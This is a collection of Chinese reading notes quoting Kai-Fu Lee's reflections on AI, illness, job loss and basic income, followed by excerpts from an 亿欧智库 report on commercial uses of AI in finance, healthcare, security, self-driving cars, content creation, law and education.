找到自己使命感最好的方法，就是想想自己死后墓碑上会写什么内容。
向死而生
面对死亡，最艰难的是面对无法重来的人生。治疗护士兼作家邦妮·韦尔（Bronnie Ware）记录了许多病人在弥留之际最常见的遗憾。面对生命的终点，这些病人清晰地回顾了他们曾经因专注于工作而忽略了生活。他们谈到，由于没有过上无愧于心的生活而感受到痛苦，后悔过于专注工作，意识到生活的意义是身边的人赋予的。没有人在回顾自己一生的时候会后悔没有工作得更努力一些，许多人后悔的都是没用更多的时间陪伴自己爱的人。
山顶上的法师
我们必须放低自己的姿态。我们必须在骨子里认识到自己的渺小，必须承认，在世界上，没有什么可以比与他人分享爱这个简单的行为更重要、更有价值。如果我们从这点出发，其余的事情就顺其自然了。这是我们真正实现自我的唯一方式。
第二意见和第二次机会
人类分辨变量之间关联的能力非常有限，需要基于少量最明显的特征——“强特征”做决策，基于简单特征对复杂疾病分期就是一个例子。再比如银行贷款时，银行调取贷款人的征信也是“强特征”，如贷款人的收入、房产价值和信用评级等信息。对于淋巴癌的分级，“强特征”只有肿瘤的数量和位置。这些“强特征”其实不能特别准确地将知识分类，它们只是为了便于知识在人类之间传承。目前，医学研究已经确定了数十个淋巴癌的其他特征，这些特征有助于更好地估计患者的预期寿命。但记住这么多因素之间复杂的相关性和预测的准确率，即使最优秀的医学生也无法做到。因此大多数医生在给患者进行癌症分期时，不会考虑那么多因素。
解脱与重生
这些领悟也令我重新审视人与机器、人类心灵与人工思维之间的关系。我回想生病的经历，从PET开始、到诊断、感受自身的痛苦以及随后的生理和心理上的恢复，通过这些我逐渐认识到，治愈我的药物包含两个部分：科技和情感。这两点都将成为人工智能未来的支柱（对此我将在下一章解释）。
我坚信的未来是由人工智能的思考能力，加上人类爱的能力构筑的。如果我们能够创造这种协同作用，我们就能在发扬最根本的人性的同时，利用人工智能无比强大的力量创造一个繁荣的世界。
危机考验与新的社会契约
即将到来的人工智能革命，无论是规模、速度还是对技术的偏向，都表明我们面临着全新且史无前例的挑战。即使失业状况没有向着最坏的方向发展，人工智能还是会继续大幅拉开互联网时代的贫富差距。在美国，我们已经开始看到一些工资停滞不前与贫富差距拉大导致的社会不稳定。随着人工智能在经济和社会其他方面的深层次应用，这个趋势将会速度更快、涉及的范围更广。历史上，就业市场最终能依靠市场的力量找回平衡，但是这一次人工智能来得太凶猛，我们必须面对失业和贫富差距加剧的考验。
3R：再培训、减时间、重分配
硅谷针对人工智能将引发的失业问题，提出三类解决方案：就业者再培训（retraining workers）、减少工作时间（reducing work hours）或重新分配收入（redistributing income）。每一类方案的出发点均是调节就业市场的某一个变量（技能、时间、报酬）。
全民基本收入
时下，最流行的再分配方案是全民基本收入（Universal Basic Income, UBI），其核心思想很简单——每个公民（或每个成年人）从政府那里定期领取收入补助金，这笔钱的申领没有任何附加条件。
人机共存：优化与人情
有关创意和关爱工作人工智能几乎不可能完成。考虑到这一点，我们应该积极发展STEM[STEM是科学（Science）、技术（Technology）、工程（Engineering）、数学（Mathematics）四门学科]教育，在教育上强调创意和思维的培养，这与下文要分析的关爱型工作，是未来教育的两个重点。在未来，由于人工智能的进步，左下角人工智能的圆圈会往右边扩张。[插图]人类与人工智能在未来可以共存
芬克的信与影响力投资
我们必须重新构思、重振企业的社会责任感（CSR）、影响力投资以及公益创业（social entrepreneurship）。过去，企业只有在时间、金钱都有富余时才会做这些事。企业家们很多时候会这样想，既然有钱了，就投资些房地产企业或初创公司，所谓社会责任感，就是捐些钱给留守儿童，还可以发发新闻稿，好好宣传一下。但是在人工智能时代，我们需要以更认真的态度来参与这些活动，同时也要拓展我们对这些活动的定义。国际大企业之前做的社会责任感项目都是传统慈善，例如环保和扶贫。如果想要应对人工智能时代的社会冲击，则需要更进一步的解决方案——为失业者创造大量的服务性工作岗位。
我希望未来能出现这样一个风投生态体系：将创造“人性服务”岗位本身视为美好的事业，同时也投资相关的产业，将资金引入能吸纳大量劳动力的、以人为本的服务项目中，如产后护理哺乳顾问、青少年运动教练、口述历史收集人、国家公园向导或者老年人陪聊等。这类岗位对社会、对个人都是有意义的，许多岗位还可以产生经济价值和营收。但投资这些创造岗位的公司不会像投资独角兽科技公司那样，可以获得100倍的回报。
政府的角色
对此我有不同的看法。我并不想生活在这样的社会：人工智能精英与世隔绝，坐拥惊人的财富，用最少量的施舍来保证广大的失业人员不闹事。我希望，我们可以共同创造出一个全员协同发展的制度，妥善运用人工智能创造出来的财富，建立更有人情味、更有爱心、更人性化的社会。
结束语 现在已是未来
乔布斯建议他们未必要预先规划好人生和事业。乔布斯告诉在座的学生：“（人生是由无数转折点组成的）你在向前展望时不可能将这些转折点串联起来，只能在回顾时将点点滴滴联系起来。所以，你必须相信这些点在未来都可能联结起来。”
人人都是撰写者
人工智能未来如何发展，最重要的因素是人类如何采取行动。
我们生活在地球上，不是仅仅为了埋头苦干，不断做那些重复性的工作。我们不需要只为了积累财富而忙碌一生，最终在过世后把财富传给下一代，然后让他们重复这一过程。如果我们相信生命的意义远不止物质上的盲目追逐，那么人工智能就有可能帮助我们揭开更深层次的意义。

简评
开复博士，毕业以后，或者说走向导师的路途上，看到的万事万物太宏观了。具体和宏观结合的点依然不可避免的走向宏观，以至于我看了书，觉得他说的什么都对。
当然，这也是问题所在










《AI进化论：解码人工智能商业场景与案例 》
数据原作者：亿欧智库
简评：亿欧智库的报告、书籍总是令人印象深刻受益匪浅，亿欧坚持使用数据说话，细分行业横向对比，向大家强烈推荐。
文章大纲业内人士力荐序第一章 跨越AI商业化“奇点”第二章 金融狂欢下的泡影第三章 积重难返？医疗AI的颠覆之路第四章 智慧安防：罪恶无处遁形第五章 自动驾驶：定义未来出行第七章 内容不再是人的专利第八章 AI赋能下的法律新格局第九章 AI进驻，教育革命即将到来

业内人士力荐
我们不再以旁观者的身份观看着变革的发生，每个人都有机会参与其中，成为这场最伟大技术变革的推动者，真正通过最先进的技术手段，来解决世界上最贴近民生的问题。
很多人问我为什么要做AI，我的答案可以追溯到五岁的时候，那时候我遇到了一个无解的问题——死亡，它让我恐惧。当我意识到这个问题是一个无解问题的时候，我开始想如何让人生更有意义，而那时我认为我需要做一个机器人，我希望可以创造另外一种智慧。也许AI对别人来说是一种选择，对我来讲则是一种使命，我希望用AI去造福人类，去创造有价值的东西。
——旷视科技创始人兼CEO印奇

序
当你认为自己理解了一件事情时，你只掌握了30%；当你可以把它讲给别人听时，则掌握了50%；当你可以将它编纂成书时，则掌握了70%。
谈及人工智能，公众层面的认知大多起源于2016年年初AlphaGo击败李世石的人机大战。但是，稍对人工智能有所了解的人士都知道，在这场机器取得胜利的大战以前，人工智能已经走过了长达60多年的“进化”历程，经历了所谓的“三起三落”。而在过去数十年，受益于机器学习算法的进步（尤其是以Geoffrey Hinton、Yoshua Bengio和Yann LeCun等人的理论为代表的深度学习），互联网服务积累的海量数据，摩尔定律的驱动，以及大公司依托其商业实力所建设的计算能力，人工智能似乎迎来了一个真正爆发的时机，最显著的表现是，其应用场景已经部分落地，并且正在创造着规模化的商业成绩。这是一项技术真正开始走向成熟的标志与信号，也让我们感受到人工智能的商业突破点可能即将到来。
站在中国的角度，当下的中国具备非常好的发展基础和环境，主要体现在：
（1）数据——中国作为商业大国和人口大国，产生的可计算数据量是绝对领先的；
（2）人才——中国正在培养大量的数学、计算机科学方面人才；
（3）商业环境——以互联网为代表的新经济，塑造了富有创新活力的商业氛围；
（4）资本——大量的风险投资基金（中国乃至全球）在中国市场投入了可观的资金，用以支持人工智能相关企业成长；
（5）政策——中国政府先后在政府工作报告和新一代人工智能发展规划方面做出了极大程度的政策支持，与人工智能相关的基础课程也即将开设于大、中、小学。
古代战场上一个人能对付两三个人就很了不起了，俗话说“双掌难敌四手”。但是在现在这个满世界都是廉价工具的环境下，处理起事务来“以一当千”完全有可能，几台电脑、几千行代码，可以轻松完成以前需要几万个人的手工作业，够震撼人心了吧？但我个人认为，信息革命30年，这些还只是前奏，等到人工智能发展起来，等到对大数据的分析趋向成熟，等到信息技术充分渗透到其他产业，等到传统的文科因为更多数据的到来而变成基础扎实的理工科……到那个时候，我们再回头来看，今天的这些成就，不过只是历史的先声。
由天宇亿欧公司副总裁 亿欧智库研究院院长2018年4月于北京

第一章 跨越AI商业化“奇点”
思维使我们在感知世界的同时，也在改造着世界。
看到这里，或许你会发现，不论是木棒，还是飞机，这些工具都是对人们行动的辅助，而非“模仿”。1956年，电视刚刚开始走入人们的生活，世界上第一台电子计算机ENIAC才刚刚问世，而那时已经有一群科学家在谈论“用机器模仿人的智能”这种仅停留于概念层面的话题，不由得令人感慨人类思维的广度。也正是在这场会议中，“人工智能”（Artificial Intelligence，简称AI）一词正式诞生，由此开启了此后半个多世纪的计算机科学、神经生物学等学科的发展进程，并引发了人类对于拥有意识与学习能力的“超级人工智能”的想象。这场会议叫作“达特茅斯会议”（Dartmouth Conference）。

第一节 揭开AI的神秘面纱

当人们大谈人工智能的时候，究竟是在谈什么？
在长达半个多世纪的人工智能研究历程中，大量学者对其概念进行了不同维度的界定。综合来看，大致可分为两类。第一类，从行为和功能的角度出发，定义人工智能机器的外在行为和能够实现的功能。
第二类，则将“人工智能”定义为一门新学科或新科学。
人工智能相关研究的最终目标，是由机器替代人类完成部分相对简单的重复性任务，使人类拥有更多时间进行创造性的劳动，享受更加高效便捷的生活，真正步入“智能时代”。
今天，不少人会狭隘地认为“人工智能=深度学习”。其实，假设我们身处于20世纪80年代，我们很可能会片面地认为“人工智能=专家系统”。事实上，人工智能在不同的发展阶段——不论过去还是未来——都会因技术进步或新技术的诞生，而进一步得到发展。就目前的技术发展而言，人工智能以机器学习、数据挖掘为两大技术核心，两者技术范畴上有所交叉。
机器学习又包含对抗学习等诸多种类，其中备受瞩目的就是深度学习。按照拓扑结构分类，深度学习可分为卷积神经网络、循环神经网络和全连接神经网络，并通过算法框架实现深度学习过程。在机器学习与数据挖掘的技术之上，实现了目前市场上最常见的三大技术应用，即计算机视觉、智能语音技术和自然语言处理


第二节 当资本位移，谁被颠覆

亿欧智库AI创投数据库显示，2012年至2017年间，中国共有439家AI企业获得投资，这439家企业大多数成立于2012年之后。2015年出现AI创业热潮，新创AI企业多达117家。2016年这一数字开始下降，2017年则仅出现27家AI新创企业。我们可以预见，2018年后AI市场的角逐竞争将在存量的AI“玩家”间展开

（2012—2017年获投企业）。[插图]图1-2 中国AI企业成立时间（2012—2017年获投企业）来源：亿欧智库AI创投数据库
2018年将可能是“大浪淘沙”的一年，预计将会有大批AI企业被淘汰。从行业角度来看，投资事件数量和投资金额最高的四大行业分别是企业服务、汽车交通、医疗健康和金融。

第二章 金融狂欢下的泡影
金融行业在发展过程中积累了大量的数据，包括客户信息、交易信息、资产负债信息等，放眼各垂直领域，金融被认为是人工智能落地最快的领域之一。
第二节 前台到后台的多点繁荣
随着人力成本的提高、客户消费体验要求的提升及人工智能技术的发展，劳动力密集型的传统客服已经不能适应市场需求，对客服提出了更高的要求。客户群体数目大，咨询频率高，人工客服成本高，难以满足需求，智能客服的出现可以帮助解决这些问题。据统计，智能机器人客服可以解决85%的常见客服问题，而一个机器人客服的花费只相当于一个人工客服的10%。
智能客服系统主要由四部分构成：客户、渠道、处理内容及对话管理系统，客户通过手机、电脑等渠道将文字、语音、图像等处理内容传递给对话管理系统，由系统内部处理后再将回复内容原路反馈给客户。智能客服系统通过自然语言理解、自然语言生成及知识图谱等技术，掌握客户需求，自动推送客户特征、知识库等内容，如图所示

智能营销是指在可量化的数据基础上分析消费者个体的消费模式和特点，并以此来划分顾客群体，精准地找到目标客户，然后进行精准营销和个性化推荐的过程。与传统营销相比，智能营销基于大数据、机器学习计算框架等技术，具有时效性强、精准性高、关联性强、性价比高、个性化强等特点。
金融的本质在于风险定价，风控对于金融机构和平台来说都是一种保障。
金融市场参与者众多，金融业务面临众多的风险挑战：
首先，群体欺诈多，大多是有组织、有规模“进攻”的；
第二，数据使用难，金融大数据积累多但非结构化；
第三，高价值数据少，目前风控采取的数据多为日常交易数据，央行征信数据依然很少；
第四，风险高，客群下沉，欺诈成本低；
最后，量大，人工无法大规模审核，成本高。
智能风控整个流程主要分为四个阶段：
第一阶段，数据收集，数据是智能风控的基础，主要数据来源为网络行为数据、授权数据、交易时产生的数据、第三方数据等；
第二阶段，行为建模，在这个过程中，需要对大量数据进行结构化处理，形成最有效的信用评估组合；
第三阶段，用户画像，通过前期的数据收集和行为建模，形成对每个用户的画像；
第四阶段，风险定价，主要包括行为监控、反欺诈违约和催收。

金融业务风控新挑战和智能风控基本流程见图2-5。 金融业务风控新挑战和智能风控基本流程
第三节 保险科技：AI全流程嵌入
第三节 保险科技：AI全流程嵌入中国保险业已经经历了六十多年的发展历程，主要经历了三个阶段。第一阶段为传统保险时代，1949年，中国第一家国有保险公司成立，拉开了中国保险业发展的帷幕。
第二阶段为互联网保险时代，伴随着整个信息技术革命的时代浪潮，互联网、移动互联网技术开始渗透到包括保险业在内的各个产业。
第三阶段为保险科技时代，随着信息技术的大发展，近两年越来越多的前沿技术也开始被应用到金融乃至保险行业。具体而言，区块链、人工智能、大数据、云计算、物联网等技术，开始逐步运用于产品创新、保险营销和保险公司内部管理等方面，保险的方方面面都开始从科技进步的红利中得益，企业通过创建新的平台、运用新的技术更好地为保险消费者服务。
数据显示，过去的十年间，中国保险行业在普及度和精密度上都发生了比较大的改变。年保费规模从2006年的5600亿元上升到2016年的3万亿元，年均增幅达20%，保险的深度及密度（保险深度：某地保费收入占该地GDP之比；保险密度：按当地人口计算的人均保险费额）也从2006年的2.6%及430元/人，快速增长至2016年的4.2%及2200元/人。但是保险大国并不等于保险强国，中国保险市场仍然存在着保险深度和保险密度不够、渗透率低、行业影响力不足等问题。
第四节 技术先行，应用多久落地
人工智能的滚滚洪流，正在影响金融领域的各个应用场景。我们认为，智能金融未来发展将围绕智能化、场景化和个性化展开。智能化为基础，可分为三个层次：
第一层次为Robot，即可以实现简单的数据收集整理工作（助理分析师）；
第二层次为Smart，即可以实现数据的简单分析（初级分析师）；
第三层次为Intelligent，即可以实现数据的决策支持和深度洞察（高级分析师）。

第三章 积重难返？医疗AI的颠覆之路


医疗，关乎民生之根本，涉及每一个人的身体与精神健康。今天，中国的医疗产业——涵盖医疗救护、医药、保健、生物技术等多个领域——已然是一个具有万亿元市场规模的大产业。2016年，中共中央、国务院印发的《“健康中国2030”规划纲要》中指出，到2020年，健康服务业总规模将超过8万亿元，到2030年达到16万亿元。

◆ 第一节 医疗变革时代的黎明

所谓“赋能”，字面意义上就是指为某个主体赋予某种能力或能量。人工智能技术与医疗产品、医疗服务的结合，事实上就是一种赋能现象，它不仅使得医疗生产活动成本降低、效率提升、效果增强，而且牵动整个医疗产业链发生新变化，如图3-1所示。[插图]图3-1 医疗产业链（部分）示意图

◆ 第二节 院内院外，医疗AI应用百花齐放

亿欧智库将医疗人工智能的应用场景分为七类，
分别是：
虚拟助理、
医学影像、
大数据辅助诊疗、
药物研发、
医院管理、
科研平台、
健康管理。
部分应用场景又存在多类子应用，涉及医院内部的各个流程，以及医院以外的各类健康相关环节，应用可谓“百花齐放”。


医学影像在当今医学诊断中具有举足轻重的作用，与医学临床的距离最近，而众多疑难问题尚未得到解决，由此医学影像成了医疗人工智能最热门的应用场景。综合来看，人工智能与医疗影像的结合，主要体现于运用图像识别技术实现三类核心功能：病灶自动分析与识别、影像自动勾画与自适应放疗、影像三维重建。


肺癌的早期筛查类产品是最多的。
一方面是由于国内在各类癌症中肺癌的发病率、死亡率均位居首位；
另一方面是因为以卷积神经网络为主的肺结节检测算法相对成熟。
以推想科技为例，其智能CT辅助筛查产品AI-CT完成一张肺部CT片的识别用时仅5秒，而人类医生通常需要十几分钟到半个小时；对于人的肉眼容易遗漏掉的三毫米以内的小病灶，AI-CT更容易识别，肺结节发现准确率高达90%。


上图展示的就是推想科技智能CT辅助筛查产品（AI-CT）的功能界面。其他国内典型企业代表有腾讯觅影、健培科技、羽医甘蓝等。[插图]图3-4 推想科技智能CT辅助筛查产品（AI-CT）功能界面来源：推想科技
由于AI+医学影像类产品涉及诊疗环节，属于CFDA（国家食品药品监督管理总局）规定的三类医疗器械目录范围，所以产品申报与认证过程十分严格，耗时较长。
目前基本成型的AI+医学影像产品大多数处于医院试用阶段，未来可见的业务模式主要有两类：
第一类，面向医院、体检中心和第三方医学影像中心，出售软件的使用权限（License），以及收取一定的技术服务费用；
第二类，向医疗器械厂商寻求合作，将软件与硬件设备捆绑销售，或将产品功能嵌入硬件设备中。近年来，国产医疗器械逐渐发展起来，与雅培、罗氏、西门子、瓦里安、医科达等海外公司产品形成竞争，“AI+医学影像”软件与医疗器械的结合，可帮助医疗器械厂商提供先进的软硬一体化解决方案，将大大提升医疗器械厂商的产品竞争力。

全世界每日产生的医疗数据量十分巨大，其中蕴藏着巨大的利用价值，然而由于各地区数据结构化程度低，缺乏统一的标准，并且有些地区的医疗数字化程度还很低。根据IDC Digital预测，截至2020年，全球的医疗数据量将达40万亿GB，其中约80%的数据为非结构化数据，如图3-6所示。[插图]图3-6 全球产生的医疗数据量预测（万亿GB）来源：IDC Digital



中国的医药市场，是一个不断增长的千亿元级消费市场。中康CMH的监测数据显示，2010—2016年间，中国零售药店市场总规模（以终端零售价格计算）年均增长率达10%以上，2016年总规模已达到3377亿元，如下图所示。围绕中国巨大的医药市场，处于产业链上游的药物研发环节被重点关注。[插图]图3-7 2009—2016年中国零售药店销售规模（亿元）来源：中康CMH



药物研发包含新药研发、老药新用、药物筛选、药物副作用预测、药物跟踪研究等方面的内容，以“研发成本高、周期长、风险大”为主要特点。

一款成功获批上市的新药，需要经过化合物研究、临床前研究、临床研究（临床Ⅰ、Ⅱ、Ⅲ期试验）、SCFDA或CFDA审批等流程，耗时往往达10年之久，平均研发费用约有15亿美元之多。
此外，药物研发的成功率较低，平均5000种合成化合物中，仅有1种能进入临床Ⅱ期实验。人工智能深度学习算法能够帮助科研工作者快速、准确地挖掘和筛选合适的化合物或生物，达到缩短新药研发周期、降低新药研发成本、提高新药研发成功率的目的。目前深度学习在药物研发方面的主要贡献包括两点：

第一，提高化合物的筛选效率，优化化合物构效关系（即药物的化学结构与药效的关系）；
第二，同一种药物的不同晶型在外观、溶解度、生物有效性等方面可能会有显著不同，深度学习算法能够辅助预测小分子药物晶型结构，以把握药物的稳定性、生物利用度及疗效。

目前，人工智能的主要成果体现于抗肿瘤药、心血管药、孤儿药（罕见药），以及经济欠发达地区常见的传染病药，其中抗肿瘤药占1/3。人工智能与药物研发结合最典型的案例，是硅谷公司Atomwise通过IBM超级计算机，在分子结构数据库中筛选治疗方法，筛选出820万种候选化合物，研发成本仅为数千美元，研究周期仅需要几天。

2015年，Atomwise基于现有的候选药物，应用AI算法，不到一天时间就成功地寻找出能控制埃博拉病毒的两种候选药物，以往类似研究需要耗时数月甚至数年时间。


病历结构化，是指针对医院多年积累下的非结构化数据的结构化处理，从而使数据真正发挥其价值。病历结构化主要用到自然语言处理技术，随着深度学习的发展，循环神经网络进一步推动了自然语言处理技术的发展。图3-8所示为自然语言处理结构图。


图3-8 自然语言处理结构图
目前国内提供病历结构化服务的公司，往往面向医院提供开放性平台服务，以服务换数据，实现共赢。具体的业务模式分为两类：

第一类，是开放性的中文病历语义API，提供能与医院无缝对接的“可插拔式”模块；
第二类，是提供智能病历分析服务，服务类型和范围较广，如为保险公司做医疗风险评估、精准医学大数据中心的业务规划和组织架构设计、协助重大研究课题进行前期分析研究、开发医疗人才培养系统，等等。

提供病历结构化服务的公司，未来在保险与医药行业也存在较大的盈利空间，例如帮助保险公司发现并减少过度医疗行为，帮助药企监控新产品的安全性等。森亿智能是国内专注于医学文本分析的人工智能公司，其主要业务是通过机器学习和自然语言处理技术自动抓取医学文本中的临床变量，将积压的病例自动转化为结构化数据，生成标准化的数据库。智能算法能挖掘变量相关性，从而为临床科研提供专业性的统计分析支持。
其他国内典型企业代表有零氪科技、大数医达、深思考等。DRGs智能系统中的“DRGs”，英文全称是Diagnosis Related Groups，可翻译为疾病诊断相关分类。它能够根据病人的年龄、性别、住院天数、临床诊断、病症、手术情况、疾病严重程度等因素把病人分入500～600个诊断相关组，然后决定应该给医院多少补偿。DRGs智能系统能有效降低医疗保险机构的管理难度和费用，有利于宏观预测和控制医疗费用。过去常常出现某些患有重大疾病的患者在手术及用药过程中占用太多补偿保额的情况，而DRGs智能系统可以帮助医院合理分配保额，帮助医院合理控制费用。国内典型企业是医渡云。

许多医疗人工智能公司抓住了医生的科研需求，依托其本身的技术算法能力和计算能力，制作易于操作的人工智能科研平台，为医生科研提供以数据分析为方向的辅助性服务。打造科研平台，本身就是对企业现有技术能力和资源的商业价值的充分挖掘。其更大的意义在于，企业能够借助科研平台，与医生、医院或研究机构建立科研合作机会，以换取模型训练数据及未来的商业变现渠道，其具体情况如图3-9所示。国内典型的企业包括推想科技、零氪科技、新屿科技等。


企业与医疗机构资源优势互补，形成科研合作
健康管理

从目前来看，国内将AI与精神健康管理相结合的企业较少，而精神健康管理与每一个人都息息相关，潜在市场较大。根据2009年世界卫生组织的调查，中国精神疾病患者占中国总人口的7%，已经超过心脏病和癌症，成为中国医疗体系最大的负担。2015年，英国世界权威医学杂志《柳叶刀》中的一项研究指出，中国约有1.73亿人有精神疾病，其中1.58亿人从未接受过专业治疗。从全球范围来看，AI在精神健康管理方面的应用，主要有情绪管理和精神疾病管理两类。AI在情绪调节场景中的运用，主要是通过人脸识别用户情绪，以聊天、推送音乐或视频等多种交互方式帮助用户调节心情。典型的企业有美国创业公司Emotient（已被苹果公司收购）、英国创业公司Realeyes等。



◆ 第三节 下注未来，医疗AI的春天不是现在

隐私与伦理问题，将是国家立法机构、AI技术服务企业所面临的紧迫问题。我国有关保护患者隐私权的法律规定，对医疗人工智能公司获取足量的患者数据造成较大的阻碍。我国自2010年正式施行的《中华人民共和国侵权责任法》第六十二条规定，医疗机构及其医务人员应当对患者的隐私保密。泄露患者隐私或者未经患者同意公开其病历资料，造成患者损害的，应当承担侵权责任。随着人工智能技术的不断进步，人类所产生的数据类型越来越多（例如基因数据），保护每一个人的数据安全的法律体系尚未建立，这将是医疗人工智能产品落地过程中的隐形挑战。由于模型训练中使用的数据多样性有限，可能无形中构成对部分社会群体的歧视。例如，某些语音识别产品无法识别一些方言，使这些方言使用者被排除于产品使用范围以外。由于医疗人工智能产品的价格普遍较高，可能会首先被收入水平较高的群体使用。尤其当癌症等致死率较高的病症通过人工智能手段找到治愈方法后，价格问题会加剧患者间的机会不平等，这将可能在医疗领域掀起一场有关道德伦理的大讨论。

第四章 智慧安防：罪恶无处遁形
◆ 第二节 社会需求驱动智慧安防


根据博思数据公布的调查数据，截至2016年中国前端摄像头出货量已达到4338万台，预计在2020年出货量将会达到5422万台，如图4-3所示。这意味着中国每日视频监控录像达上千PB，而过去累积的历史数据更多，并且海量视频监控数据中99%以上都是非结构化数据。利用“人海战术”进行视频检索和分析的方式，不仅需要消耗大量人力，而且效果不佳。IMS Research的一项实验表明，人在盯着视频画面仅仅22分钟之后，人眼将对视频画面里95%以上的活动信息视而不见。


第五章 自动驾驶：定义未来出行

◆ 第二节 三头六臂，引领风潮

自动驾驶安全分为两类：
其一为行驶安全（safety），针对汽车系统可能发生的故障；
其二是信息安全，包括数据的存储、应用、传输安全，以及来自传感器、车联网等不同系统的信息安全。黑客通过网络侵入汽车，篡改或偷取车内数据信息，干扰甚至控制汽车，将严重威胁用户和社会安全。鉴于这个问题，360、腾讯等企业已经开始未雨绸缪，在信息安全方面进行布局。


自动驾驶带来新的交通出行生态，共享被认为是未来汽车行业的发展趋势。研究机构普华永道预测，未来汽车产业价值将发生显著变化：
以往占产业利润41%的汽车销售业务在未来将下降到29%，而共享出行业务所产生的利润将从10%以下猛涨至20%。类似滴滴、神州优车这样的出行运营商将有机会彻底改变传统的汽车消费模式，通过汽车共享和网络效应占据消费市场，竞争汽车行业核心地位。
因此，滴滴大力研发自动驾驶，设立研究院，在各地试验智慧交通技术就在情理之中了。目前国内部分车企已有转型为服务运营商的倾向（如吉利汽车）。亿欧智库认为，出行服务属于公共领域，国内车企具备成功转型的可能性。出行市场to C的特质，将使最先取得网络效应的企业拥有赢者通吃的机会。


第七章 内容不再是人的专利

◆ 第一节 AI挑战记者和作家

文本类内容，如诗歌、小说、新闻稿、散文等，是日常生活中最基本的内容形式。围绕文本类内容的生产，诞生了记者、作家、编剧等职业。近两年来，AI开始逐渐参与文本类内容的创作，其创作出的部分内容，已难以分辨是由人还是由机器所创作。AI在文本内容生产中的应用主要包括写诗、编剧、写小说、写新闻、编程、辅助内容创作等。AI写新闻稿已经在头部媒体中投入实际应用，具体用于个别题材的新闻生产，所生产的内容在全部媒体内容中的占比还很小。AI在剧本结果预测、前期素材搜集、文本纠错等方面也已经得到应用，未来可能被整合到各种文本编辑器和工具之中。AI在作诗、编剧等方面也都取得了一些进展，但目前均处于尝试研究阶段。


新闻对写作速度的要求较高，机器写作显然比人类快很多，因此国内外多家媒体一直在进行机器写稿的研究。AI的发展为此提供了可能，越来越多的主流媒体开始应用机器人写稿。此前，机器只能处理财经、体育、地震等内容结构相对固定领域的新闻。


AI能够辅助语句纠错。2017年6月，百度百家号平台上线了“语义纠错”功能，该功能通过对作者在百家号上创作的文章正文进行快速校对，帮助作者识别和更正内容中的错别字，准确率达到75%。百家号此次上线的AI智能语义纠错功能，能够结合上下文理解词语，找出不符合语义的错别字。例如“通过锻炼，回复效果比较好”这句话，错别字纠错功能识别不出错别字，但语义纠错就会提示“回复”应修改为“恢复”。

◆ 第六节 AI+内容生产：万里长征第一步

在目前不具备推理能力的弱人工智能阶段，AI在小部分领域能够实现自动生产内容，在大部分领域，更适合与人协作，提升素材搜集、整理、检查等方面的效率。在与人协作的过程中，机器可能会完成大部分机械重复工作，人完成小部分创造性工作


人机协作目前有三种方式：
一是机器生成初稿，人进行修改和润色；
二是人提出框架，机器完成细节填充；
三是机器作为工具帮人搜集筛选素材、检验纠错等。


第八章 AI赋能下的法律新格局

展示了基于人工智能的产品与服务用于法律各参与主体相关工作的情况

法律事件的参与者有三个主体，分别是当事人（个人或企业）、律师和法院。对不同的主体，AI能够提供的服务也不尽相同。
人工智能在法律当中的应用主要包括：
为当事人提供法律咨询、律师匹配、公司法务协助；
为律师和律师事务所提供案件查询、文案整理、案情预测、智能咨询服务；
为法院提供文字处理、辅助审判、智能客服服务。


第九章 AI进驻，教育革命即将到来


百年大计，教育为本。
教育作为民族振兴、社会进步的基石，一直是我国优先发展的行业。
目前，我国教育观念相对落后，内容方法比较陈旧，教育结构和布局不尽完善，人民对良好的教育有着强烈期盼。虽然随着互联网的发展，线上录播课和直播课等教育形式解决了部分教育资源不足的问题，但是并没有从根本上解决问题。那么，人工智能的出现，能否加速中国教育产业的改革创新？它改变了哪些传统教育工作？


◆ 第一节 繁重教育工作的解放

虽然“人工智能+教育”概念已被频繁提及，但目前行业内仅有一个模糊的概念，内涵和外延界定不清晰，为了方便解释，这里我们将“AI+教育”用AIED（Artificial Intelligence in Education）表示。我们认为，AIED是人工智能技术对教育产业的赋能现象，本质上是人工智能对教育工作的替代和辅助，将教师和学生从低效重复的工作中解放出来，进而提升教学与学习效率。

人工智能在教育领域的应用，从教育主体来看可分为三类：

● 教育机构的教务工作、人事财务工作、学校管理工作等。
● 教师的教研、教学、测评、管理工作。
● 学生在学校和家庭中的学习任务。



根据国家统计局和财政部数据，2012年至2016年，我国教育经费总投入累计接近17万亿元，年均增长率达7.9%。2016年，全国财政性教育经费高达31396.3亿元，与2015年的29221.45亿元相比，增长了7.44%，占GDP的4.22%，财政性教育经费占GDP的比例自2012年以来连续5年保持在4%以上。可以看出，国家高度重视教育工作，不断加大教育投入。


互联网与移动互联网技术的发展与成熟，催生了以在线教育为代表的新形态教育模式。据CNNIC数据显示，2016年中国在线教育和手机在线教育总规模达23562万人，互联网与移动互联网在学校教育与家庭教育中的重要性日益凸显。随着人工智能技术的成熟，语音识别与图像识别被应用于教育领域，出现了英语语音测评、智能批改、拍照搜题、智能陪练、智能情绪识别等各类AIED产品。



◆ 第二节 教育生态的新变革

人工智能在学校管理工作中的应用主要包括智能图书馆、智能行政管理、智能招生管理、智能财务管理、智能升学和职业规划、智能分班排课和智慧校园安防。


目前国内服务于教育机构的AI企业较少，技术服务能力有待提升。AI应用主要集中于智能分班排课、智能升学和职业规划。


教师的日常工作主要包括教研、教学、测评及学生管理工作。
教师通过教学研究，挖掘与反思教学问题，总结教学经验，研究出更适合学生的教学方法，包括课堂授课、学生辅导、课后答疑解惑等多个环节。
此外，教师还要通过作业与考试的形式，对学生的学习情况进行评价，以及进行课堂与班级管理等。人工智能对教师的这四部分工作均已表现出一定的替代性，从而使得教师有更多时间和精力来对学生进行个性化的教学与辅导，同时缓解了学生个性化教学需求与教师时间相对有限之间的矛盾，实现了自适应学习。


市场上已知的AIED产品主要分为五类：
英语语音测评、
智能批改与习题推荐、
分级阅读、
教育机器人和智能陪练。


其中，英语语音测评、智能批改与习题推荐、教育机器人的相关AI企业均在10家以上，而分级阅读和智能陪练的较少。
此外，还有智能学情分析、智能情绪识别等产品形态。智能学情分析是在积累了学生学习成绩、学习进度、学习习惯等数据后，对其进行智能分析，并给出分析报告，协助教师对学生学习情况进行管理，设计个性化教学方案，如极课大数据的“极课EI”。目前专门做智能学情分析的公司较少，其产品主要渗透在以上五类产品之中，对学生学习效果进行分析并反馈。

图 教师被人工智能替代的工作内容


◆ 第三节 AI+教育未来发展趋势与挑战

从教育机构发展的角度看，教师需要具备与人工智能配合教学的能力。教育系统的各个方面、各个维度关系复杂，目前的AIED产品只是一种辅助、替代部分教育工作的手段和工具，还不足以改变整个系统。


